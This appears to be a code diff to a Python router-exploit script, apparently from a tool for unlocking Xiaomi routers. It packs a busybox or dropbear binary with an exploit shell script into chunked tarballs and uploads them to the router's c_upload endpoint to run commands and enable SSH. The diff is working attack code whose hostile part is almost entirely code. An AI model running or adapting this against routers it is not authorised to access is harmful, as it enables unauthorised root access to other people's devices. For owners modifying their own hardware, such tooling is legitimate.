@@ -10,6 +10,7 @@ import hashlib
 import requests
 import socket
 import tarfile
+import gzip
 
 import xmir_base
 from gateway import *
@@ -29,18 +30,14 @@ else:
     dn_dir = 'data/payload/'
 
 print("Begin creating a payload for the exploit...")
-fn_payload1 = 'tmp/payload1.tar.gz'
-fn_payload2 = 'tmp/payload2.tar.gz'
-fn_payload3 = 'tmp/payload3.tar.gz'
 
 if use_ssh:
     fn_pfname = 'dropbearmulti'
 else:
     fn_pfname = 'busybox'
 
-fn_pf1 = dn_tmp + fn_pfname + '_01'
-fn_pf2 = dn_tmp + fn_pfname + '_02'
-fn_pf3 = dn_tmp + fn_pfname + '_03'
+fn_pf = f'{dn_tmp}/{fn_pfname}' + '_{num}'
+fn_payload = f'{dn_tmp}/payload' + '_{num}.tar.gz'
 
 fn_suffix = '_mips'
 if dn == 'R3D' or dn == 'D01':
@@ -48,25 +45,36 @@ if dn == 'R3D' or dn == 'D01':
 if dn == "RB03":
     fn_suffix = '_arm64'
 
-fn_pf = dn_dir + fn_pfname + fn_suffix
+fn_pf_orig = dn_dir + fn_pfname + fn_suffix
 
-os.remove(fn_payload1) if os.path.exists(fn_payload1) else None
-os.remove(fn_payload2) if os.path.exists(fn_payload2) else None
-os.remove(fn_payload3) if os.path.exists(fn_payload3) else None
+for num in range(0, 9):
+    fn = fn_payload.format(num = num)
+    os.remove(fn) if os.path.exists(fn) else None
+    fn = fn_pf.format(num = num)
+    os.remove(fn) if os.path.exists(fn) else None
 
-with open(fn_pf, "rb") as file:
+with open(fn_pf_orig, "rb") as file:
     pf = file.read()
-psize = len(pf) // 3
-wsize = psize + 8000
-with open(fn_pf1, "wb") as file:
-    file.write(pf[:wsize])
-pf = pf[wsize:]
-wsize = psize - 8000
-with open(fn_pf2, "wb") as file:
-    file.write(pf[:wsize])
-pf = pf[wsize:]
-with open(fn_pf3, "wb") as file:
-    file.write(pf)
+    pf = gzip.compress(pf, compresslevel = 9)
+
+max_payload_size = 100*1024
+max_chunk_size = 90*1024
+
+FN_pf = [ ]
+FN_payload = [ ]
+for num in range(0, 9):
+    pos = num * max_chunk_size
+    chunk = pf[pos:pos+max_chunk_size]
+    if not chunk:
+        break
+    fn = fn_pf.format(num = num)
+    with open(fn, "wb") as file:
+        file.write(chunk)
+    FN_pf.append(fn)
+    FN_payload.append(fn_payload.format(num = num))
+
+if len(FN_pf) < 1:
+    raise RuntimeError('len(FN_pf) < 1')
 
 fn_exploit = "exp10it.sh"
 command = f"sh /tmp/{fn_exploit}"
@@ -79,40 +87,26 @@ data = template.format(router_ip_address=gw.ip_addr, command=command)
 with open(dn_tmp + fn_executor, "wt", encoding = "UTF-8", newline = "\n") as file:
     file.write(data)
 
-with tarfile.open(fn_payload1, "w:gz", compresslevel=9) as tar:
-    tar.add(fn_pf1, arcname = os.path.basename(fn_pf1))
+for num, fn_pf in enumerate(FN_pf):
+    with tarfile.open(FN_payload[num], "w:gz", compresslevel=9) as tar:
+        tar.add(fn_pf, arcname = os.path.basename(fn_pf))
+        if num == len(FN_pf) - 1:
+            tar.add(dn_tmp + fn_executor, arcname = fn_executor)
+            tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
+            if use_ssh:
+                tar.add(dn_dir + 'dropbear.uci.cfg', arcname = 'dropbear.uci.cfg')
+                tar.add(dn_dir + 'dropbear.init.d.sh', arcname = 'dropbear.init.d.sh')
 
-with tarfile.open(fn_payload2, "w:gz", compresslevel=9) as tar:
-    tar.add(fn_pf2, arcname = os.path.basename(fn_pf2))
-
-with tarfile.open(fn_payload3, "w:gz", compresslevel=9) as tar:
-    tar.add(fn_pf3, arcname = os.path.basename(fn_pf3))
-    tar.add(dn_tmp + fn_executor, arcname = fn_executor)
-    tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
-    if use_ssh:
-        tar.add(dn_dir + 'dropbear.uci.cfg', arcname = 'dropbear.uci.cfg')
-        tar.add(dn_dir + 'dropbear.init.d.sh', arcname = 'dropbear.init.d.sh')
-
-os.remove(fn_pf1) if os.path.exists(fn_pf1) else None
-os.remove(fn_pf2) if os.path.exists(fn_pf2) else None
-os.remove(fn_pf3) if os.path.exists(fn_pf3) else None
-
-tgz_size1 = os.path.getsize(fn_payload1)
-if tgz_size1 > 100*1024 - 128:
-    die(f'File size "{fn_payload1}" exceeds 100KiB')
-
-tgz_size2 = os.path.getsize(fn_payload2)
-if tgz_size2 > 100*1024 - 128:
-    die(f'File size {fn_payload2} exceeds 100KiB')
+for num, fn_pf in enumerate(FN_pf):
+    os.remove(fn_pf) if os.path.exists(fn_pf) else None
+    tgz_size = os.path.getsize(FN_payload[num])
+    if tgz_size > max_payload_size - 128:
+        die(f'File size "{FN_payload[num]}" exceeds 100KiB')
 
 print("Start uploading the exploit with payload...")
 
-if (fn_payload1):
-    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload1, 'rb')})
-if (fn_payload2):
-    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
-if (fn_payload3):
-    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})
+for num, fn_payload in enumerate(FN_payload):
+    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload, 'rb')})
 
 time.sleep(1)
 
